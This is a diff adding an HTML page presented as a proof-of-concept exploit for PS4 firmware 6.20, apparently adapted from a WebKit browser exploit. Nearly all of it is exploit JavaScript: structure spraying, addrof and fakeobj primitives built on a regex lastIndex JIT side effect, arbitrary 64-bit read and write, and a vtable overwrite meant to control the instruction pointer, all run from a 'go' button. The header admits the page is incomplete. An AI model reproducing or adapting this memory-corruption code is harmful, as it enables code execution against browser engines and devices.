@@ -1,0 +1,335 @@
+<!-- 
+* by Ktioszdev (KtioszDev)
+* PoC Exploit for PS4 6.20 
+* -
+* This file contains “kexploit.js” “rop.js” “syscalls.js”
+* This HTML couldn’t work because it’s incomplete
+-->
+
+<html>
+<!DOCTYPE html>
+<head>
+<title>Exploit PoC 6.20 PS4</title><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico">
+	<div class="credits">
+		<script type="text/javascript">
+		            document.write(new Date().getFullYear());
+		</script>&copy; <a href="https://twitter.com/ktioszdev">KtioszDev</a><br>
+	</div>
+<center>PoC Exploit<br>
+device:<br><br>
+<a href="index.html">Reload Exploit</a><br><br>
+<pre id="console"></pre><br><br></center>	
+    <center><script>
+        // Must create this indexing type transition first,
+        // otherwise the JIT will deoptimize later.
+        var a = [13.37, 13.37];
+        a[0] = {};
+
+        function log(txt) {
+            console.log(txt);
+        }
+
+        function logtext(txt) {
+            var c = document.createElement("div");
+            c.innerHTML = txt;
+            document.getElementById("log").appendChild(c);
+        }
+        var msg = "";
+
+        function logmsg(txt) {
+            msg += txt + "\n";
+        }
+
+        var print = log;
+        var debug_alert = alert;
+        var alert = logmsg;
+
+        function makeJITCompiledFunction() {
+            function target(x) {
+                return x;
+            }
+
+            // Force JIT compilation.
+            for (var i = 0; i < 1000; i++) {
+                target(i);
+            }
+
+            return target;
+        }
+
+        var _log0, _log, _dview;
+        // wraps two uint32s into double precision
+        function u2d(low, hi) {
+            if (!_dview) _dview = new DataView(new ArrayBuffer(16));
+            _dview.setUint32(0, hi);
+            _dview.setUint32(4, low);
+            return _dview.getFloat64(0);
+        }
+
+        // unwraps uints from double
+        function d2u(d) {
+            if (!_dview) _dview = new DataView(new ArrayBuffer(16));
+            _dview.setFloat64(0, d);
+            return {
+                low: _dview.getUint32(4),
+                hi: _dview.getUint32(0)
+            };
+        }
+
+        var conversion_buffer = new ArrayBuffer(8)
+        var f64 = new Float64Array(conversion_buffer)
+        var i32 = new Uint32Array(conversion_buffer)
+
+        var BASE32 = 0x100000000
+
+        function f2i(f) {
+            f64[0] = f
+            return i32[0] + BASE32 * i32[1]
+        }
+
+
+        function i2f(i) {
+            i32[0] = i % BASE32
+            i32[1] = i / BASE32
+            return f64[0]
+        }
+
+        function hex(x) {
+            if (x < 0)
+                return `-${hex(-x)}`
+            return `0x${x.toString(16)}`
+        }
+
+        function xor(a, b) {
+            var res = 0,
+                base = 1
+            for (var i = 0; i < 64; ++i) {
+                res += base * ((a & 1) ^ (b & 1))
+                a = (a - (a & 1)) / 2
+                b = (b - (b & 1)) / 2
+                base *= 2
+            }
+            return res
+        }
+
+        function fail(x) {
+            print('FAIL ' + x)
+            throw null
+        }
+
+        var target_func = makeJITCompiledFunction();
+
+        var count = 0;
+
+        function clearLog() {
+            document.getElementById("log").innerHTML = '';
+            msg = "";
+        }
+
+        function reloadPage() {
+            window.location.reload()
+        }
+
+        var structure_spray = []
+
+        var sprayed = false;
+
+        function sprayStructure() {
+            if (sprayed) return;
+            logtext("structure has sprayed!");
+            for (var i = 0; i < 0x1000; ++i) {
+                var ary = {
+                    a: 1,
+                    b: 2,
+                    c: 3,
+                    d: 4,
+                    e: 5,
+                    f: 6,
+                    h: i2f(0x0000000000001000)
+                }
+                // supposedly this property goes to the butterfly
+                ary['prop' + i] = 1
+                structure_spray.push(ary)
+            }
+            sprayed = true;
+        }
+
+        function fakeobj(addr) {
+            array = [1.1, 1.2, 1.3];
+
+            var hacked = false;
+
+            let r = /foo/g;
+            regexLastIndex = {};
+            regexLastIndex.toString = function () {
+                if (hacked) {
+                    array[0] = {};
+                }
+                return "1";
+            };
+
+            function foo_fakeobj(r, s) {
+                array[0] = 2.2;
+                r.test(s);
+                array[1] = addr;
+                return 0;
+            }
+
+            for (let i = 0; i < 10000; ++i) {
+                r.lastIndex = regexLastIndex;
+                let result = foo_fakeobj(r, "bar");
+
+                if (i == 10000 - 2) {
+                    hacked = true;
+                }
+            }
+
+            return array[1];
+        }
+
+
+        function addrof(obj) {
+            array = [1.1, 1.2, 1.3];
+
+            var hacked = false;
+
+            let r = /foo/g;
+            regexLastIndex = {};
+            regexLastIndex.toString = function () {
+                if (hacked) {
+                    array[1] = obj;
+                }
+                return "1";
+            };
+
+            function foo_addrof(r, s) {
+                array[0] = 2.2;
+                r.test(s);
+                return array[1];
+            }
+
+            for (let i = 0; i < 10000; ++i) {
+                r.lastIndex = regexLastIndex;
+                let result = foo_addrof(r, "bar");
+                if (i == 10000 - 1) {
+                    return result;
+                }
+                if (i == 10000 - 2) {
+                    hacked = true;
+                }
+            }
+        }
+
+        var printaddr = function (name, obj) {
+            addr = addrof(obj);
+            alert(name + " : " + hex(f2i(addr)));
+            a = d2u(addr);
+            print(name + " low: " + a.low.toString(16) + " ; high: " + a.hi);
+        }
+
+        function code_exec_by_vtab(read64, write64) {
+            var vtable_array = new Array(0x200);
+            for (let i = 0; i < 100; i++) {
+                vtable_array[i] = i2f(0x1000deadbeef);
+            }
+
+            var wrapper = document.createElement("div");
+            printaddr("wrapper", wrapper);
+            var wrapper_addr = f2i(addrof(wrapper));
+            var el_addr = read64(wrapper_addr + 0x20); // offset is 0x20 here, different from 10.13.3's 0x18
+            var vtable_addr = read64(el_addr);
+            alert("vtable_addr: " + hex(vtable_addr));
+            vtable_array_addr = f2i(addrof(vtable_array))
+            printaddr("vtable_array ", vtable_array)
+            debug_alert(msg);
+            bf = read64(vtable_array_addr + 8);
+            write64(el_addr, i2f(bf));
+            debug_alert("done!");
+            // control rip with 0x1000deadbeef
+            wrapper.addEventListener('click', function () {})
+        }
+
+        function pwn() {
+
+            printaddr("structure_spray", structure_spray);
+
+            var manager = structure_spray[500];
+            var leak_addr = f2i(addrof(manager));
+
+            var victimobj = structure_spray[550]; // victimobj's address > manager's address
+            var victimobj_addr = f2i(addrof(victimobj));
+            // if (victimobj_addr < leak_addr) {
+            //     debug_alert("checking failed");
+            //     restart();
+            // }
+            victimobj.prop550 = 0x1337;
+
+            function victim_write(val) {
+                victimobj.prop550 = val;
+            }
+
+            function victim_read() {
+                return victimobj.prop550;
+            }
+
+            printaddr("manager", manager);
+            printaddr("victimobj", victimobj);
+
+            i32[0] = 0x800;
+            i32[1] = 0x01082107 - 0x10000; // 10.13.5 Array JSCell, 0x21 for ArrayType, 07 is double shape, 
+            var container = {
+                // p0 to make fake at aligned 16 byte
+                p0: 0,
+                jsCellHeader: f64[0],
+                butterfly: manager,
+                mask: 0xfffffff
+            }
+
+            printaddr("container", container);
+            a = d2u(addrof(container));
+            fake = fakeobj(u2d(a.low + 0x20, a.hi));
+
+            printaddr("fake", fake);
+            alert("manager butterfly: " + hex(f2i(fake[1])));
+
+            var victimobj_butterfly = f2i(fake[(victimobj_addr + 8 - leak_addr) / 8]);
+            alert("victimobj_butterfly: " + hex(victimobj_butterfly));
+
+            function set_victim_addr(where) {
+                fake[(victimobj_addr + 8 - leak_addr) / 8] = i2f(where + 16);
+            }
+
+            function reset_victim_addr() {
+                fake[(victimobj_addr + 8 - leak_addr) / 8] = i2f(victimobj_butterfly);
+            }
+
+            function read64(where) {
+                set_victim_addr(where);
+                var res = f2i(addrof(victim_read()));
+                reset_victim_addr();
+                return res;
+            }
+
+            function write64(where, what) {
+                set_victim_addr(where);
+                victim_write(fakeobj(what));
+                reset_victim_addr();
+            }
+
+            code_exec_by_vtab(read64, write64);
+        }
+
+        function trigger() {
+            sprayStructure();
+            pwn();
+        }
+    </script><center>
+</head>
+
+<!-- <body onload="setTimeout(trigger, 2000);"> -->
+</body>
+<button onclick="trigger()"style="font-size: 1cm; margin: 1cm;">go</button>
+<pre id="log"></pre>
+
+
+</html>
